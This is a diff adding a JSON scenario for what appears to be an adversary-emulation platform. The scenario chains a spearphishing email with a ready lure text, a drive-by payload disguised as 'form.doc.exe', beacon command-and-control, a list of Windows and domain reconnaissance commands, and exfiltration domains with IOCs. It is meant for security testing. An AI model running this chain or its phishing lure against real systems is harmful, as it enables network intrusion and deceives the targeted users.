@@ -1,0 +1,637 @@
+{
+    "meta_data": {
+        "name": "beaconer",
+        "version": "v1.0.1",
+        "title": "Beaconer Deployment Scenario",
+        "description": "Gains access to a host via a spearphishing link. Deploys a beaconer and collects information on the host.",
+        "author": "Attack Content",
+        "suggested_duration": 1208
+    },
+    "procedures": [
+        {
+            "tactic": "Actuator",
+            "technique": "Infrastructure",
+            "label": "actuator",
+            "preconditions": {
+                "tool": "self.tool_name"
+            }
+        },
+        {
+            "tactic": "Interfaces",
+            "technique": "Infrastructure",
+            "label": "Interfaces",
+            "preconditions": {
+                "tool": "self.tool",
+                "exfil": "self.exfil",
+                "driveby": "self.driveby"
+            }
+        },
+        {
+            "tactic": "DNS",
+            "technique": "Infrastructure",
+            "label": "DNS",
+            "preconditions": {
+                "tool": "self.tool",
+                "exfil": "self.exfil",
+                "driveby": "self.driveby"
+            }
+        },
+        {
+            "tactic": "NGINX",
+            "technique": "Infrastructure",
+            "label": "NGINX",
+            "preconditions": {
+                "self.tool_name": "self.tool",
+                "payload": "self.payload_name",
+                "exfiltration": "self.exfil",
+                "driveby": "self.driveby",
+                "driveby_ctl": "self.chimera"
+            }
+        },
+        {
+            "tactic": "PayloadCheapride",
+            "technique": "Infrastructure",
+            "label": "Payload",
+            "preconditions": {
+                "tool": "self.tool"
+            }
+        },
+        {
+            "tactic": "SpearPhishingLink",
+            "technique": "InitialAccess",
+            "label": "spearPhishingLink",
+            "preconditions": {
+                "actuator": "self.actuator",
+                "phishing": "self.phish_1",
+                "tool": "self.tool",
+                "driveby": "self.driveby",
+                "target": "self.target_1",
+                "tune": {
+                    "body": {
+                        "template": [
+                            "We need your PC processing power to help save the world.  Place open the link and donate some of your pc processing to the cause!\nhttp://",
+                            "self.driveby_domain",
+                            "/",
+                            "self.payload_name",
+                            "\nLisa"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "DriveByCompromise",
+            "technique": "InitialAccess",
+            "label": "driveByCompromise",
+            "preconditions": {
+                "actuator": "self.actuator",
+                "phishing": "self.phish_1",
+                "tool": "self.tool",
+                "driveby": "self.driveby",
+                "target": "self.target_1"
+            }
+        },
+        {
+            "tactic": "UserExecution",
+            "technique": "Execution",
+            "label": "userExecution",
+            "preconditions": {
+                "actuator_id": "self.actuator",
+                "phishing": "self.phish_1",
+                "tool": "self.tool",
+                "driveby": "self.driveby",
+                "target": "self.target_1"
+            }
+        },
+        {
+            "tactic": "WebProtocols",
+            "technique": "c2",
+            "label": "webProtocols_1",
+            "preconditions": {
+                "actuator_id": "self.actuator",
+                "phishing": "self.phish_1",
+                "tool": "self.tool",
+                "driveby": "self.driveby",
+                "target": "self.target_1",
+                "tune": {
+                    "infra": true
+                }
+            }
+        },
+        {
+            "tactic": "SystemInformationDiscovery",
+            "technique": "Discovery",
+            "label": "systemInformationDiscovery_t1_1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "systeminfo"
+                }
+            }
+        },
+        {
+            "tactic": "SystemInformationDiscovery",
+            "technique": "Discovery",
+            "label": "systemInformationDiscovery_t1_2",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "net config workstation"
+                }
+            }
+        },
+        {
+            "tactic": "SystemInformationDiscovery",
+            "technique": "Discovery",
+            "label": "systemInformationDiscovery_t1_3",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "cmd /c dir"
+                }
+            }
+        },
+        {
+            "tactic": "SystemInformationDiscovery",
+            "technique": "Discovery",
+            "label": "systemInformationDiscovery_t1_4",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "wmic cpu get caption, deviceid, name, numberofcores, maxclockspeed, status"
+                }
+            }
+        },
+        {
+            "tactic": "SystemInformationDiscovery",
+            "technique": "Discovery",
+            "label": "systemInformationDiscovery_t1_5",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "driverquery -v"
+                }
+            }
+        },
+        {
+            "tactic": "SystemInformationDiscovery",
+            "technique": "Discovery",
+            "label": "systemInformationDiscovery_t1_6",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "chkdsk"
+                }
+            }
+        },
+        {
+            "tactic": "SystemInformationDiscovery",
+            "technique": "Discovery",
+            "label": "systemInformationDiscovery_t1_7",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "cmd /c set"
+                }
+            }
+        },
+        {
+            "tactic": "SystemInformationDiscovery",
+            "technique": "Discovery",
+            "label": "systemInformationDiscovery_t1_8",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "cmd /c ver"
+                }
+            }
+        },
+        {
+            "tactic": "SystemNetworkConfigurationDiscovery",
+            "technique": "Discovery",
+            "label": "systemNetworkConfigurationDiscovery_t1_1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "route print"
+                }
+            }
+        },
+        {
+            "tactic": "ProcessDiscovery",
+            "technique": "Discovery",
+            "label": "ProcessDiscovery_t1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "tasklist -v"
+                }
+            }
+        },
+        {
+            "tactic": "SystemNetworkConfigurationDiscovery",
+            "technique": "Discovery",
+            "label": "systemNetworkConfigurationDiscovery_t1_2",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "ipconfig /all"
+                }
+            }
+        },
+        {
+            "tactic": "SystemInformationDiscovery",
+            "technique": "Discovery",
+            "label": "systemInformationDiscovery_t1_9",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "cmd /c path"
+                }
+            }
+        },
+        {
+            "tactic": "SystemNetworkConfigurationDiscovery",
+            "technique": "Discovery",
+            "label": "systemNetworkConfigurationDiscovery_t1_2",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "ipconfig /all"
+                }
+            }
+        },
+        {
+            "tactic": "SecuritySoftwareDiscovery",
+            "technique": "Discovery",
+            "label": "securitySoftwareDiscovery_t1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "netsh advfirewall show allprofiles"
+                }
+            }
+        },
+        {
+            "tactic": "SystemNetworkConnectionsDiscovery",
+            "technique": "Discovery",
+            "label": "systemNetworkConnectionsDiscovery_t1_2",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "netstat -ano"
+                }
+            }
+        },
+        {
+            "tactic": "LocalGroups",
+            "technique": "Discovery",
+            "label": "localGroups_t1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "net localgroup administrators"
+                }
+            }
+        },
+        {
+            "tactic": "SystemOwnerUserDiscovery",
+            "technique": "Discovery",
+            "label": "systemOwnerUserDiscovery_t1_1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "net user"
+                }
+            }
+        },
+        {
+            "tactic": "SystemOwnerUserDiscovery",
+            "technique": "Discovery",
+            "label": "systemOwnerUserDiscovery_t1_2",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "whoami /all /fo list"
+                }
+            }
+        },
+        {
+            "tactic": "RemoteSystemDiscovery",
+            "technique": "Discovery",
+            "label": "remoteSystemDiscovery_t1_1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "net view /all"
+                }
+            }
+        },
+        {
+            "tactic": "RemoteSystemDiscovery",
+            "technique": "Discovery",
+            "label": "remoteSystemDiscovery_t1_2",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "net view /all /domain"
+                }
+            }
+        },
+        {
+            "tactic": "DomainAccount",
+            "technique": "Discovery",
+            "label": "domainAccount_t1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "net user /domain"
+                }
+            }
+        },
+        {
+            "tactic": "DomainAccount",
+            "technique": "Discovery",
+            "label": "domainGroups_t1_1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "powershell net groups 'Domain Computers' /domain"
+                }
+            }
+        },
+        {
+            "tactic": "DomainAccount",
+            "technique": "Discovery",
+            "label": "domainGroups_t1_2",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "powershell net groups 'Domain Controllers' /domain"
+                }
+            }
+        },
+        {
+            "tactic": "DomainAccount",
+            "technique": "Discovery",
+            "label": "domainGroups_t1_3",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "powershell net groups 'Domain Admins' /domain"
+                }
+            }
+        },
+        {
+            "tactic": "SystemNetworkConnectionsDiscovery",
+            "technique": "Discovery",
+            "label": "systemNetworkConnectionsDiscovery_t1_3",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "netstat -ano"
+                }
+            }
+        },
+        {
+            "tactic": "AgentExit",
+            "technique": "Utility",
+            "label": "AgentExit",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1"
+            }
+        }
+    ],
+    "iocs": {
+        "domain": [
+            "beaconer.com",
+            "b3ac0n3r.com",
+            "pulsingbeacon.com",
+            "lighthouse.org",
+            "beaconfreqs.com",
+            "beaconandeggs.com",
+            "beacons.com",
+            "beaconators.com",
+            "callbacks.com",
+            "pointybeacons.com"
+        ],
+        "ip": [
+            "3.67.163.50/24",
+            "3.64.161.50/24",
+            "3.64.115.50/24",
+            "64.68.202.11/24",
+            "64.68.203.11/24",
+            "3.130.204.160/24",
+            "3.130.205.160/24",
+            "207.148.219.143/24",
+            "207.148.238.143/24",
+            "207.148.249.143/24"
+        ],
+        "binary": [
+            "pulse.exe",
+            "WindowsLightDriver.exe",
+            "MicrosoftLights.exe"
+        ]
+    },
+    "spec": {
+        "emaillist": "@('Janice Durham <janice.durham@site.com>', 'Darryl Richmond <darryl.richmond@site.com>', 'Nelda Rios <nelda.rios@site.com>', 'Joanna Wilkerson <joanna.wilkerson@site.com>')",
+        "tool": {
+            "1": {
+                "name": "cheapride_v1",
+                "beacon": "30",
+                "jitter": "15",
+                "ioc-ip_callback": "122.49.200.108/24",
+                "ioc-domain_callback": "inf0rm.bed1rcati.com",
+                "ioc-binary_payload_name": "form.doc.exe"
+            }
+        },
+        "phishing": {
+            "1": {
+                "ioc-server_addr": "200.200.200.201",
+                "from_addr": "lisa@internet.com",
+                "to_addrs": "Madelyn.Luna@site.com",
+                "cc": "",
+                "bcc": "",
+                "subject": "Save The World!",
+                "body_subtype": "plain",
+                "attach": "",
+                "username": "lisa",
+                "password": "",
+                "port": "25"
+            }
+        },
+        "chimera": {
+            "api-control_ip": "10.10.200.60"
+        },
+        "exfil": {
+            "1": {
+                "ioc-ip_exfil": "161.135.1.25/24",
+                "ioc-domain_exfil": "deepwaterhorizon.com"
+            }
+        },
+        "driveby": {
+            "1": {
+                "ioc-ip_driveby": "161.135.1.22/24",
+                "ioc-domain_driveby": "texaspumps.us"
+            }
+        },
+        "targets": {
+            "1": {
+                "payload_destination": "c:\\users\\Public"
+            }
+        }
+    },
+    "preconditions": {
+        "state": {},
+        "initial": {
+            "tool_name": {
+                "path": [
+                    "tool",
+                    "1",
+                    "name"
+                ]
+            },
+            "payload_name": {
+                "path": [
+                    "tool",
+                    "1",
+                    "ioc-binary_payload_name"
+                ]
+            },
+            "tool": {
+                "path": [
+                    "tool",
+                    "1"
+                ]
+            },
+            "exfil": {
+                "path": [
+                    "exfil",
+                    "1"
+                ]
+            },
+            "driveby": {
+                "path": [
+                    "driveby",
+                    "1"
+                ]
+            },
+            "driveby_domain": {
+                "path": [
+                    "driveby",
+                    "1",
+                    "ioc-domain_driveby"
+                ]
+            },
+            "chimera": {
+                "path": [
+                    "chimera"
+                ]
+            },
+            "phish_1": {
+                "path": [
+                    "phishing",
+                    "1"
+                ]
+            },
+            "target_1": {
+                "path": [
+                    "targets",
+                    "1"
+                ]
+            }
+        },
+        "effects": {
+            "actuator": {
+                "path": [
+                    "actuator",
+                    "actuator",
+                    "ret",
+                    "registered_id"
+                ],
+                "default": 0
+            },
+            "scenario_infrastructure": {
+                "path": [
+                    "infrastructure"
+                ]
+            },
+            "agent_tgt1": {
+                "path": [
+                    "webProtocols_1",
+                    "agent",
+                    "ret",
+                    "agent_id"
+                ]
+            },
+            "agent_tgt2": {
+                "path": [
+                    "webProtocols_2",
+                    "agent",
+                    "ret",
+                    "agent_id"
+                ]
+            },
+            "agent_tgt3": {
+                "path": [
+                    "webProtocols_3",
+                    "agent",
+                    "ret",
+                    "agent_id"
+                ]
+            }
+        }
+    }
+}
